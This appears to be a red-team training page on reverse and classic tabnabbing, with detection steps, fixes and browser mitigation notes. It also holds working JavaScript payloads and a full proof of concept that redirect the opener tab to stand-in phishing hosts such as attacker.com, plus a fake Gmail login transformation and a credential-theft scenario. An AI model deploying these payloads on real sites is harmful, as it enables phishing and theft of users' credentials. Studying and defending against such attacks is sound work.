---
layout: training-page
title: "Tabnabbing — Red Team Academy"
module: "Web Hacking"
tags:
  - tabnabbing
  - reverse-tabnabbing
  - phishing
  - open-redirect
  - social-engineering
page_key: "web-tabnabbing"
render_with_liquid: false
---

# Tabnabbing

Tabnabbing (specifically **Reverse Tabnabbing**) is an attack where a page opened via a link from the target site — typically in a new browser tab — uses JavaScript to redirect the *original* background tab to a phishing site. Because users rarely check the URL of a background tab when they return to it, they may believe they have been logged out of the legitimate site and enter their credentials into the phishing page.

## Tools

- **Discovering Reverse Tabnabbing** — Burp Suite BApp extension that identifies vulnerable links — `portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30`

## How It Works

When a browser opens a link with `target="_blank"`, the new tab gains a reference to the original tab's window object via `window.opener`. If the original page does not include `rel="noopener"` or `rel="noreferrer"`, the newly opened page can call `window.opener.location = "http://evil.com"` to navigate the original tab to an attacker-controlled URL.

Attack flow:

1. Attacker posts a link on the target site (forum post, user profile, comment) pointing to a site they control.
2. The link uses `target="_blank"` without `rel="noopener"`.
3. Victim clicks the link — it opens in a new tab.
4. The attacker's page runs: `window.opener.location = "http://evil-phishing-site.com"`
5. The original tab (background) is silently redirected to the phishing page.
6. Victim returns to the background tab, sees what appears to be a login page, and enters credentials.

## Attack Payload

The attacker's page must contain this JavaScript — executed when the victim opens the link:

```
<!-- Attacker's page: evil.com/index.html -->
<script>
  if (window.opener) {
    window.opener.location = "http://phishing.evil.com/login";
  }
</script>
```

More stealthy version — wait a few seconds before redirecting to reduce suspicion:

```
<script>
  setTimeout(function() {
    if (window.opener) {
      window.opener.location = "http://phishing.evil.com/login";
    }
  }, 3000);
</script>
```

## Identifying Vulnerable Links

Search the target application's HTML for links that open in a new tab without proper `rel` attributes:

```
<!-- Vulnerable -->
<a href="..." target="_blank" rel="">
<a href="..." target="_blank">

<!-- Safe -->
<a href="..." target="_blank" rel="noopener noreferrer">
```

Grep the application's source or crawled HTML for vulnerable patterns:

```
# Find all _blank links lacking noopener
grep -E 'target="_blank"' source.html | grep -v 'noopener'

# Using Burp Suite — install the "Discovering Reverse Tabnabbing" BApp
# It automatically flags vulnerable links during passive scanning
```

## Exploitation Conditions

For Reverse Tabnabbing to be exploitable, all of the following must be true:

- The target site allows user-submitted content that includes links (forums, comments, user profiles, wikis)
- The link uses `target="_blank"`
- The link does NOT include `rel="noopener"` or `rel="noreferrer"`
- The attacker controls the destination URL

## Modern Browser Behavior

As of 2021, all major browsers (Chrome, Firefox, Safari, Edge) apply `noopener` behavior by default for cross-origin links with `target="_blank"` — even without the explicit attribute. However, this does not apply to same-origin links, and older browser versions or certain configurations remain vulnerable. The explicit attribute is still required for complete protection across all environments.

## Fix

Add `rel="noopener noreferrer"` to all links that use `target="_blank"`:

```
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">External Link</a>
```

For dynamically generated links (e.g., user-submitted URLs), enforce this in the rendering layer — never rely on user input to include this attribute.

---

## Classic Tabnabbing (Aza Raskin's Original Attack)

Classic tabnabbing (the original 2010 attack by Aza Raskin) works differently from reverse tabnabbing. Instead of a new tab attacking the opener, the attack page itself transforms into a fake login page while the user is viewing another tab.

Mechanics:
1. Attacker hosts a page that looks innocuous initially.
2. The page uses `document.visibilityState` to detect when the tab goes into the background (user switched to another tab).
3. When the tab becomes hidden, the page silently replaces its own content and favicon with a convincing clone of a real login page (e.g., Gmail, company SSO).
4. The browser tab title changes to "Gmail - Sign in" and the favicon becomes the Google logo.
5. When the user switches back, they see what looks like a session timeout and enter their credentials.

```javascript
// Classic tabnabbing — page transforms itself when user looks away
document.addEventListener('visibilitychange', function() {
  if (document.visibilityState === 'hidden') {
    // User switched tabs — transform this page
    document.title = 'Gmail - Sign in';
    document.querySelector('link[rel="icon"]').href = '/gmail-favicon.ico';
    document.body.innerHTML = '<div class="gmail-clone">...</div>';
    window.location = 'https://attacker.com/gmail-phish';
  }
});
```

The `visibilitychange` / `visibilityState` API approach:

```javascript
// Detect tab focus changes
document.addEventListener('visibilitychange', function() {
  if (document.visibilityState === 'hidden') {
    // Tab has become background — trigger transformation
    transformPage();
  }
});

// Alternative: page focus/blur events
window.addEventListener('blur', function() {
  transformPage();
});
```

---

## Reverse Tabnabbing — Complete PoC

Full proof of concept for reverse tabnabbing demonstrating the window.opener attack chain:

```html
<!DOCTYPE html>
<html>
<head>
  <title>Legitimate-Looking Page</title>
</head>
<body>
  <h1>Welcome to our partner site</h1>
  <p>This page opened from a vulnerable application.</p>

  <script>
    // Method 1: Immediate redirect of opener
    if (window.opener && !window.opener.closed) {
      window.opener.location = 'https://attacker.com/phishing-login-page';
    }
  </script>
</body>
</html>
```

Delayed variant with page activity simulation:

```html
<script>
  // Wait for user to be distracted, then redirect background tab
  function doTabnab() {
    if (window.opener && !window.opener.closed) {
      try {
        window.opener.location.replace('https://attacker.com/login-clone');
      } catch(e) {
        // Cross-origin error if opener already navigated away
        window.opener.location = 'https://attacker.com/login-clone';
      }
    }
  }

  // Trigger after 5 seconds — user likely switched tabs by then
  setTimeout(doTabnab, 5000);

  // Or trigger when this tab becomes active (user came back here first)
  document.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'visible') {
      doTabnab();
    }
  });
</script>
```

---

## Realistic Attack Scenario

**Target:** A security forum or community site that allows users to post external links.

**Setup:**
1. Attacker creates a phishing page at `https://attacker.com/app/login` that clones the forum's login page exactly, including styling, favicon, and logo.
2. Attacker registers on the forum and posts a comment: "Check out this related tool: [click here](https://attacker.com/app/useful-page)"
3. The forum software renders the link with `target="_blank"` but no `rel="noopener"`.

**Execution:**
1. Victim sees the forum post and clicks the link.
2. `https://attacker.com/app/useful-page` opens in a new tab — the content looks legitimate (a real tool page, documentation, etc.).
3. Three seconds later, the JS on attacker.com runs: `window.opener.location = 'https://attacker.com/app/login'`
4. The original forum tab (now in the background) silently navigates to the phishing login page.
5. The phishing page displays: "Your session has expired. Please log in again."
6. Victim switches back to the forum tab, doesn't notice the URL changed (or the URL is convincingly similar), and logs in.
7. Credentials are captured and the victim is forwarded to the real forum.

---

## history.back() Technique

An alternative that doesn't require window.opener — abuse `history.back()` combined with HTML5 History API:

```javascript
// Push a fake history state that points to attacker's page
history.pushState({}, '', '/login');
document.title = 'Session Expired - Please Log In';
// Then redirect
window.location = 'https://attacker.com/capture';
```

This only works if the attacker controls a page on the same origin (e.g., via XSS).

---

## Modern Browser Mitigations

Chrome 88+ (released January 2021) changed the default behavior for `target="_blank"` links: `rel="noopener"` is now implied automatically for cross-origin links. This means `window.opener` is null by default in modern Chrome even without the attribute.

| Browser | Version | Default noopener for cross-origin |
| --- | --- | --- |
| Chrome | 88+ | Yes |
| Firefox | 79+ | Yes |
| Safari | 12.1+ | Yes |
| Edge | 88+ | Yes |
| IE 11 | All | No — still vulnerable |

**Remaining attack surface:**
- Same-origin links (noopener is NOT implied for same-origin target=_blank even in modern browsers)
- Older browser versions in enterprise environments (IE 11, legacy Chrome/Firefox)
- Electron-based desktop apps using Chromium webview components
- Mobile browsers may lag behind desktop versions

---

## Manual and Automated Detection Methodology

### Manual Testing Steps

1. Crawl or spider the target application to collect all anchor tags.
2. Filter for `target="_blank"` links.
3. For each, check the HTML for `rel="noopener"` or `rel="noreferrer"`.
4. For vulnerable links that point to attacker-controllable destinations (e.g., user-submitted URLs), document them.
5. Set up a test page with `if (window.opener) { window.opener.location = 'http://your-server.com' }`.
6. Click the vulnerable link as a victim, then check your server logs for a request from the opener tab.

### Automated Detection with Burp Suite

1. Install the "Discovering Reverse Tabnabbing" BApp from the BApp Store.
2. Browse the target application normally — the extension passively flags all `target="_blank"` links missing `noopener`.
3. Review the Issues tab for findings categorized by severity.

### Using grep on crawled responses

```
# Save all responses from a crawl, then:
grep -rn 'target="_blank"' crawl-output/ | grep -v 'noopener' | grep -v 'noreferrer'
```

---

## Resources

- Reverse Tabnabbing — OWASP — owasp.org/www-community/attacks/Reverse_Tabnabbing
- Tabnabbing — Wikipedia
- Discovering Reverse Tabnabbing — PortSwigger BApp Store
- Tabnapping — Aza Raskin — `azarask.in/blog/post/a-new-type-of-phishing-attack/`
- The Target="_blank" Vulnerability by Example — Alex Yumashev — `jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/`
- MDN Web Docs: Link types — `developer.mozilla.org/en-US/docs/Web/HTML/Link_types/noopener`
